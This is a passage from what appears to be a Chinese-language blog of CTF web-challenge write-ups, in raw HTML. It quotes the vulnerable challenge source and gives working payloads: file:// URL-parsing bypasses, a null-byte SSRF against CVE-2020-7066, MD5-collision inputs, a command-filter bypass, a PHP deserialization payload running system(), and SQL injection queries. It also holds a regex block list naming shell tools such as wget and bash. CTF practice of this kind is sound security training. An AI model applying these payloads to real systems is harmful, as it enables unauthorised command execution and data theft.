class=\"hljs-number\">1</span>] = <span class=\"hljs-string\">&#x27;.&#x27;</span>.<span class=\"hljs-built_in\">join</span>(newhost)<br>    #去掉 url 中的空格<br>    finalUrl = <span class=\"hljs-built_in\">urlunsplit</span>(parts).<span class=\"hljs-built_in\">split</span>(<span class=\"hljs-string\">&#x27; &#x27;</span>)[<span class=\"hljs-number\">0</span>]<br>    host = parse.<span class=\"hljs-built_in\">urlparse</span>(finalUrl).hostname<br>    if host == <span class=\"hljs-string\">&#x27;suctf.cc&#x27;</span>:<br>        return urllib.request.<span class=\"hljs-built_in\">urlopen</span>(finalUrl, timeout=<span class=\"hljs-number\">2</span>).<span class=\"hljs-built_in\">read</span>()<br>    else:<br>        return <span class=\"hljs-string\">&quot;我扌 your problem? 333&quot;</span><br></code></pre></td></tr></table></figure></li>\n<li><p>第一层，当<code>//</code>没有正确引入时hostname就无法正确匹配到，也就是说我们只要<code>////</code>即可绕过第一层</p>\n</li>\n<li><p>第二、三层和第一层一样，也绕过了</p>\n</li>\n<li><p>Nginx重要文件位置</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><br>配置文件存放目录：<span class=\"hljs-regexp\">/etc/</span>nginx<br>主配置文件：<span class=\"hljs-regexp\">/etc/</span>nginx<span class=\"hljs-regexp\">/conf/</span>nginx.conf<br>管理脚本：<span class=\"hljs-regexp\">/usr/</span>lib64<span class=\"hljs-regexp\">/systemd/</span>system/nginx.service<br>模块：<span class=\"hljs-regexp\">/usr/</span>lisb64<span class=\"hljs-regexp\">/nginx/m</span>odules<br>应用程序：<span class=\"hljs-regexp\">/usr/</span>sbin/nginx<br>程序默认存放位置：<span class=\"hljs-regexp\">/usr/</span>share<span class=\"hljs-regexp\">/nginx/</span>html<br>日志默认存放位置：<span class=\"hljs-regexp\">/var/</span>log/nginx<br>配置文件目录为：<span class=\"hljs-regexp\">/usr/</span>local<span class=\"hljs-regexp\">/nginx/</span>conf/nginx.conf<br></code></pre></td></tr></table></figure></li>\n<li><p>/usr/local/nginx/conf/nginx.conf读到flag位置file:////suctf.cc/usr/fffffflag拿到flag</p>\n</li>\n<li><p>据说预期解是<code>file://suctf.c℆sr/fffffflag</code>(<a href=\"https://zhuanlan.zhihu.com/p/104885386?utm_source=wechat_session\">https://zhuanlan.zhihu.com/p/104885386?utm_source=wechat_session</a>)</p>\n</li>\n</ol>\n<h2 id=\"GKCTF2020-CheckIN\"><a href=\"#GKCTF2020-CheckIN\" class=\"headerlink\" title=\"[GKCTF2020]CheckIN\"></a>[GKCTF2020]CheckIN</h2><ol>\n<li><p>源码：</p>\n<figure class=\"highlight php-template\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php-template\"><span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">title</span>&gt;</span>Check_In<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">title</span>&gt;</span></span><br><span class=\"xml\"></span><span class=\"php\"><span class=\"hljs-meta\">&lt;?php</span> </span><br><span class=\"php\">highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);</span><br><span class=\"php\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">ClassName</span></span></span><br><span class=\"hljs-class\"><span class=\"php\"></span>&#123;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$code</span> = <span class=\"hljs-literal\">null</span>;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$decode</span> = <span class=\"hljs-literal\">null</span>;</span><br><span class=\"php\">        <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"></span>)</span></span><br><span class=\"hljs-function\"><span class=\"php\">        </span>&#123;</span><br><span class=\"php\">                <span class=\"hljs-keyword\">$this</span>-&gt;code = @<span class=\"hljs-keyword\">$this</span>-&gt;x()[<span class=\"hljs-string\">&#x27;Ginkgo&#x27;</span>];</span><br><span class=\"php\">                <span class=\"hljs-keyword\">$this</span>-&gt;decode = @base64_decode( <span class=\"hljs-keyword\">$this</span>-&gt;code );</span><br><span class=\"php\">                @<span class=\"hljs-keyword\">Eval</span>(<span class=\"hljs-keyword\">$this</span>-&gt;decode);</span><br><span class=\"php\">        &#125;</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">x</span>(<span class=\"hljs-params\"></span>)</span></span><br><span class=\"hljs-function\"><span class=\"php\">        </span>&#123;</span><br><span class=\"php\">                <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$_REQUEST</span>;</span><br><span class=\"php\">        &#125;</span><br><span class=\"php\">&#125;</span><br><span class=\"php\"><span class=\"hljs-keyword\">new</span> ClassName();</span><br></code></pre></td></tr></table></figure></li>\n<li><p>给了shell，先看一下phpinfo，发现有disable_functions，应该是饶disable_functions的题目，<code>/var/tmp/</code>可以写文件，参考LD_PRELOAD的without send_mail方法绕过，利用/readflag命令拿到flag</p>\n</li>\n</ol>\n<h2 id=\"GKCTF2020-cve版签到\"><a href=\"#GKCTF2020-cve版签到\" class=\"headerlink\" title=\"[GKCTF2020]cve版签到\"></a>[GKCTF2020]cve版签到</h2><ol>\n<li>提示cve-2020-7066，也就是可以%00截断</li>\n<li>header里有hint提示flag在localhost</li>\n<li>访问?url=127.0.0.1%00.ctfhub.com拿到提示host要以123结尾</li>\n<li>访问?url=127.0.0.123%00.ctfhub.com拿到flag</li>\n</ol>\n<h2 id=\"安洵杯-2019-easy-web\"><a href=\"#安洵杯-2019-easy-web\" class=\"headerlink\" title=\"[安洵杯 2019]easy_web\"></a>[安洵杯 2019]easy_web</h2><ol>\n<li><p>url中的img经过2次base64解码+1次ASCII Hex解码得到555.png，于是把555.png改成index.php读到源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>error_reporting(E_ALL || ~ E_NOTICE);<br>header(<span class=\"hljs-string\">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;cmd&#x27;</span>];<br><span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;img&#x27;</span>]) || !<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;cmd&#x27;</span>])) <br>    header(<span class=\"hljs-string\">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class=\"hljs-variable\">$file</span> = hex2bin(base64_decode(base64_decode(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;img&#x27;</span>])));<br><br><span class=\"hljs-variable\">$file</span> = preg_replace(<span class=\"hljs-string\">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class=\"hljs-string\">&quot;&quot;</span>, <span class=\"hljs-variable\">$file</span>);<br><span class=\"hljs-keyword\">if</span> (preg_match(<span class=\"hljs-string\">&quot;/flag/i&quot;</span>, <span class=\"hljs-variable\">$file</span>)) &#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class=\"hljs-keyword\">else</span> &#123;<br>    <span class=\"hljs-variable\">$txt</span> = base64_encode(file_get_contents(<span class=\"hljs-variable\">$file</span>));<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class=\"hljs-variable\">$txt</span> . <span class=\"hljs-string\">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$cmd</span>;<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&quot;</span>;<br><span class=\"hljs-keyword\">if</span> (preg_match(<span class=\"hljs-string\">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;</span>, <span class=\"hljs-variable\">$cmd</span>)) &#123;<br>    <span class=\"hljs-keyword\">echo</span>(<span class=\"hljs-string\">&quot;forbid ~&quot;</span>);<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class=\"hljs-keyword\">else</span> &#123;<br>    <span class=\"hljs-keyword\">if</span> ((<span class=\"hljs-keyword\">string</span>)<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;a&#x27;</span>] !== (<span class=\"hljs-keyword\">string</span>)<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;a&#x27;</span>]) === md5(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;b&#x27;</span>])) &#123;<br>        <span class=\"hljs-keyword\">echo</span> `<span class=\"hljs-variable\">$cmd</span>`;<br>    &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>        <span class=\"hljs-keyword\">echo</span> (<span class=\"hljs-string\">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class=\"hljs-meta\">?&gt;</span><br>&lt;html&gt;<br>&lt;style&gt;<br>  body&#123;<br>   background:url(./bj.png)  no-repeat center center;<br>   background-size:cover;<br>   background-attachment:fixed;<br>   background-color:<span class=\"hljs-comment\">#CCCCCC;</span><br>&#125;<br>&lt;/style&gt;<br>&lt;body&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure></li>\n<li><p>其中<code>if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))</code>利用payload</p>\n<figure class=\"highlight llvm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs llvm\">a<span class=\"hljs-operator\">=</span><span class=\"hljs-variable\">%4</span>d<span class=\"hljs-variable\">%c9</span><span class=\"hljs-variable\">%68</span><span class=\"hljs-variable\">%ff</span><span class=\"hljs-variable\">%0</span>e<span class=\"hljs-variable\">%e3</span><span class=\"hljs-variable\">%5</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%95</span><span class=\"hljs-variable\">%72</span><span class=\"hljs-variable\">%d4</span><span class=\"hljs-variable\">%77</span><span class=\"hljs-variable\">%7</span>b<span class=\"hljs-variable\">%72</span><span class=\"hljs-variable\">%15</span><span class=\"hljs-variable\">%87</span><span class=\"hljs-variable\">%d3</span><span class=\"hljs-variable\">%6</span>f<span class=\"hljs-variable\">%a7</span><span class=\"hljs-variable\">%b2</span><span class=\"hljs-variable\">%1</span>b<span class=\"hljs-variable\">%dc</span><span class=\"hljs-variable\">%56</span><span class=\"hljs-variable\">%b7</span><span class=\"hljs-variable\">%4</span>a<span class=\"hljs-variable\">%3</span>d<span class=\"hljs-variable\">%c0</span><span class=\"hljs-variable\">%78</span><span class=\"hljs-variable\">%3</span>e<span class=\"hljs-variable\">%7</span>b<span class=\"hljs-variable\">%95</span><span class=\"hljs-variable\">%18</span><span class=\"hljs-variable\">%af</span><span class=\"hljs-variable\">%bf</span><span class=\"hljs-variable\">%a2</span><span class=\"hljs-variable\">%00</span><span class=\"hljs-variable\">%a8</span><span class=\"hljs-variable\">%28</span><span class=\"hljs-variable\">%4</span>b<span class=\"hljs-variable\">%f3</span><span class=\"hljs-variable\">%6</span>e<span class=\"hljs-variable\">%8</span>e<span class=\"hljs-variable\">%4</span>b<span class=\"hljs-variable\">%55</span><span class=\"hljs-variable\">%b3</span><span class=\"hljs-variable\">%5</span>f<span class=\"hljs-variable\">%42</span><span class=\"hljs-variable\">%75</span><span class=\"hljs-variable\">%93</span><span class=\"hljs-variable\">%d8</span><span class=\"hljs-variable\">%49</span><span class=\"hljs-variable\">%67</span><span class=\"hljs-variable\">%6</span>d<span class=\"hljs-variable\">%a0</span><span class=\"hljs-variable\">%d1</span><span class=\"hljs-variable\">%55</span><span class=\"hljs-variable\">%5</span>d<span class=\"hljs-variable\">%83</span><span class=\"hljs-variable\">%60</span><span class=\"hljs-variable\">%fb</span><span class=\"hljs-variable\">%5</span>f<span class=\"hljs-variable\">%07</span><span class=\"hljs-variable\">%fe</span><span class=\"hljs-variable\">%a2</span>&amp;b<span class=\"hljs-operator\">=</span><span class=\"hljs-variable\">%4</span>d<span class=\"hljs-variable\">%c9</span><span class=\"hljs-variable\">%68</span><span class=\"hljs-variable\">%ff</span><span class=\"hljs-variable\">%0</span>e<span class=\"hljs-variable\">%e3</span><span class=\"hljs-variable\">%5</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%95</span><span class=\"hljs-variable\">%72</span><span class=\"hljs-variable\">%d4</span><span class=\"hljs-variable\">%77</span><span class=\"hljs-variable\">%7</span>b<span class=\"hljs-variable\">%72</span><span class=\"hljs-variable\">%15</span><span class=\"hljs-variable\">%87</span><span class=\"hljs-variable\">%d3</span><span class=\"hljs-variable\">%6</span>f<span class=\"hljs-variable\">%a7</span><span class=\"hljs-variable\">%b2</span><span class=\"hljs-variable\">%1</span>b<span class=\"hljs-variable\">%dc</span><span class=\"hljs-variable\">%56</span><span class=\"hljs-variable\">%b7</span><span class=\"hljs-variable\">%4</span>a<span class=\"hljs-variable\">%3</span>d<span class=\"hljs-variable\">%c0</span><span class=\"hljs-variable\">%78</span><span class=\"hljs-variable\">%3</span>e<span class=\"hljs-variable\">%7</span>b<span class=\"hljs-variable\">%95</span><span class=\"hljs-variable\">%18</span><span class=\"hljs-variable\">%af</span><span class=\"hljs-variable\">%bf</span><span class=\"hljs-variable\">%a2</span><span class=\"hljs-variable\">%02</span><span class=\"hljs-variable\">%a8</span><span class=\"hljs-variable\">%28</span><span class=\"hljs-variable\">%4</span>b<span class=\"hljs-variable\">%f3</span><span class=\"hljs-variable\">%6</span>e<span class=\"hljs-variable\">%8</span>e<span class=\"hljs-variable\">%4</span>b<span class=\"hljs-variable\">%55</span><span class=\"hljs-variable\">%b3</span><span class=\"hljs-variable\">%5</span>f<span class=\"hljs-variable\">%42</span><span class=\"hljs-variable\">%75</span><span class=\"hljs-variable\">%93</span><span class=\"hljs-variable\">%d8</span><span class=\"hljs-variable\">%49</span><span class=\"hljs-variable\">%67</span><span class=\"hljs-variable\">%6</span>d<span class=\"hljs-variable\">%a0</span><span class=\"hljs-variable\">%d1</span><span class=\"hljs-variable\">%d5</span><span class=\"hljs-variable\">%5</span>d<span class=\"hljs-variable\">%83</span><span class=\"hljs-variable\">%60</span><span class=\"hljs-variable\">%fb</span><span class=\"hljs-variable\">%5</span>f<span class=\"hljs-variable\">%07</span><span class=\"hljs-variable\">%fe</span><span class=\"hljs-variable\">%a2</span><br></code></pre></td></tr></table></figure>\n\n<p>来绕过</p>\n</li>\n<li><p>$cmd过滤了一些字符，直接<code>ca\\t+/flag</code>绕过拿到flag</p>\n</li>\n</ol>\n<h2 id=\"网鼎杯-2020-朱雀组-phpweb\"><a href=\"#网鼎杯-2020-朱雀组-phpweb\" class=\"headerlink\" title=\"[网鼎杯 2020 朱雀组]phpweb\"></a>[网鼎杯 2020 朱雀组]phpweb</h2><ol>\n<li><p>查看源代码发现有隐藏表单，发送data和时间，可能存在命令执行</p>\n</li>\n<li><p>eval、system等函数会被检测，于是先file_get_contents读一下index.php:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"> <span class=\"hljs-meta\">&lt;?php</span><br>    <span class=\"hljs-variable\">$disable_fun</span> = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">&quot;exec&quot;</span>,<span class=\"hljs-string\">&quot;shell_exec&quot;</span>,<span class=\"hljs-string\">&quot;system&quot;</span>,<span class=\"hljs-string\">&quot;passthru&quot;</span>,<span class=\"hljs-string\">&quot;proc_open&quot;</span>,<span class=\"hljs-string\">&quot;show_source&quot;</span>,<span class=\"hljs-string\">&quot;phpinfo&quot;</span>,<span class=\"hljs-string\">&quot;popen&quot;</span>,<span class=\"hljs-string\">&quot;dl&quot;</span>,<span class=\"hljs-string\">&quot;eval&quot;</span>,<span class=\"hljs-string\">&quot;proc_terminate&quot;</span>,<span class=\"hljs-string\">&quot;touch&quot;</span>,<span class=\"hljs-string\">&quot;escapeshellcmd&quot;</span>,<span class=\"hljs-string\">&quot;escapeshellarg&quot;</span>,<span class=\"hljs-string\">&quot;assert&quot;</span>,<span class=\"hljs-string\">&quot;substr_replace&quot;</span>,<span class=\"hljs-string\">&quot;call_user_func_array&quot;</span>,<span class=\"hljs-string\">&quot;call_user_func&quot;</span>,<span class=\"hljs-string\">&quot;array_filter&quot;</span>, <span class=\"hljs-string\">&quot;array_walk&quot;</span>,  <span class=\"hljs-string\">&quot;array_map&quot;</span>,<span class=\"hljs-string\">&quot;registregister_shutdown_function&quot;</span>,<span class=\"hljs-string\">&quot;register_tick_function&quot;</span>,<span class=\"hljs-string\">&quot;filter_var&quot;</span>, <span class=\"hljs-string\">&quot;filter_var_array&quot;</span>, <span class=\"hljs-string\">&quot;uasort&quot;</span>, <span class=\"hljs-string\">&quot;uksort&quot;</span>, <span class=\"hljs-string\">&quot;array_reduce&quot;</span>,<span class=\"hljs-string\">&quot;array_walk&quot;</span>, <span class=\"hljs-string\">&quot;array_walk_recursive&quot;</span>,<span class=\"hljs-string\">&quot;pcntl_exec&quot;</span>,<span class=\"hljs-string\">&quot;fopen&quot;</span>,<span class=\"hljs-string\">&quot;fwrite&quot;</span>,<span class=\"hljs-string\">&quot;file_put_contents&quot;</span>);<br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gettime</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$func</span>, <span class=\"hljs-variable\">$p</span></span>) </span>&#123;<br>        <span class=\"hljs-variable\">$result</span> = call_user_func(<span class=\"hljs-variable\">$func</span>, <span class=\"hljs-variable\">$p</span>);<br>        <span class=\"hljs-variable\">$a</span>= gettype(<span class=\"hljs-variable\">$result</span>);<br>        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$a</span> == <span class=\"hljs-string\">&quot;string&quot;</span>) &#123;<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$result</span>;<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&quot;&quot;</span>;&#125;<br>    &#125;<br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Test</span> </span>&#123;<br>        <span class=\"hljs-keyword\">var</span> <span class=\"hljs-variable\">$p</span> = <span class=\"hljs-string\">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class=\"hljs-keyword\">var</span> <span class=\"hljs-variable\">$func</span> = <span class=\"hljs-string\">&quot;date&quot;</span>;<br>        <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">$this</span>-&gt;func != <span class=\"hljs-string\">&quot;&quot;</span>) &#123;<br>                <span class=\"hljs-keyword\">echo</span> gettime(<span class=\"hljs-keyword\">$this</span>-&gt;func, <span class=\"hljs-keyword\">$this</span>-&gt;p);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class=\"hljs-variable\">$func</span> = <span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&quot;func&quot;</span>];<br>    <span class=\"hljs-variable\">$p</span> = <span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&quot;p&quot;</span>];<br><br>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$func</span> != <span class=\"hljs-literal\">null</span>) &#123;<br>        <span class=\"hljs-variable\">$func</span> = strtolower(<span class=\"hljs-variable\">$func</span>);<br>        <span class=\"hljs-keyword\">if</span> (!in_array(<span class=\"hljs-variable\">$func</span>,<span class=\"hljs-variable\">$disable_fun</span>)) &#123;<br>            <span class=\"hljs-keyword\">echo</span> gettime(<span class=\"hljs-variable\">$func</span>, <span class=\"hljs-variable\">$p</span>);<br>        &#125;<span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;Hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure></li>\n<li><p>可以看到禁用了一些危险函数，但是里面有一个Test类，可以执行命令，而且unserialize没有被禁用，就可以构造反序列化来实现命令执行。</p>\n</li>\n<li><p>payload：<code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code>拿到flag</p>\n</li>\n</ol>\n<h2 id=\"BJDCTF2020-Cookie-is-so-stable\"><a href=\"#BJDCTF2020-Cookie-is-so-stable\" class=\"headerlink\" title=\"[BJDCTF2020]Cookie is so stable\"></a>[BJDCTF2020]Cookie is so stable</h2><ol>\n<li>提示cookie，发现在flag输入id后cookie有一个user字段存在模板注入，测试4显示Hello 4</li>\n<li>发现存在过滤，过滤了:<code>()、&#39;&#39;、$</code></li>\n<li>直接用Twig的payload直接cat flag</li>\n</ol>\n<h2 id=\"SWPU2019-Web1\"><a href=\"#SWPU2019-Web1\" class=\"headerlink\" title=\"[SWPU2019]Web1\"></a>[SWPU2019]Web1</h2><ol>\n<li><p>在广告名处有过滤，可能存在注入点</p>\n</li>\n<li><p>测试<code>&#39;</code>然后点广告详情会包错，存在注入点</p>\n</li>\n<li><p>测试字段数，丧心病狂的有22个字段数。。。。</p>\n</li>\n<li><p>空格用<code>/**/</code>绕过，(select/**/version())看到是MariaDB</p>\n</li>\n<li><p><a href=\"https://blog.zeddyu.info/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/\">https://blog.zeddyu.info/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/</a></p>\n</li>\n<li><p><code>select distinct(table_name) from mysql.innodb_index_stats</code>拿到表名</p>\n</li>\n<li><p>过滤了or    无列名注入</p>\n</li>\n<li><p><code>select group_concat(b) from (select 1,2,3 as b union select * from users)a</code>拿flag</p>\n</li>\n</ol>\n<h2 id=\"安洵杯-2019-easy-serialize-php\"><a href=\"#安洵杯-2019-easy-serialize-php\" class=\"headerlink\" title=\"[安洵杯 2019]easy_serialize_php\"></a>[安洵杯 2019]easy_serialize_php</h2><ol>\n<li><p>给出源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"> <span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-variable\">$function</span> = @<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;f&#x27;</span>];<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">filter</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$img</span></span>)</span>&#123;<br>    <span class=\"hljs-variable\">$filter_arr</span> = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">&#x27;php&#x27;</span>,<span class=\"hljs-string\">&#x27;flag&#x27;</span>,<span class=\"hljs-string\">&#x27;php5&#x27;</span>,<span class=\"hljs-string\">&#x27;php4&#x27;</span>,<span class=\"hljs-string\">&#x27;fl1g&#x27;</span>);<br>    <span class=\"hljs-variable\">$filter</span> = <span class=\"hljs-string\">&#x27;/&#x27;</span>.implode(<span class=\"hljs-string\">&#x27;|&#x27;</span>,<span class=\"hljs-variable\">$filter_arr</span>).<span class=\"hljs-string\">&#x27;/i&#x27;</span>;<br>    <span class=\"hljs-keyword\">return</span> preg_replace(<span class=\"hljs-variable\">$filter</span>,<span class=\"hljs-string\">&#x27;&#x27;</span>,<span class=\"hljs-variable\">$img</span>);<br>&#125;<br><br><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$_SESSION</span>)&#123;<br>    <span class=\"hljs-keyword\">unset</span>(<span class=\"hljs-variable\">$_SESSION</span>);<br>&#125;<br><br><span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-string\">&quot;user&quot;</span>] = <span class=\"hljs-string\">&#x27;guest&#x27;</span>;<br><span 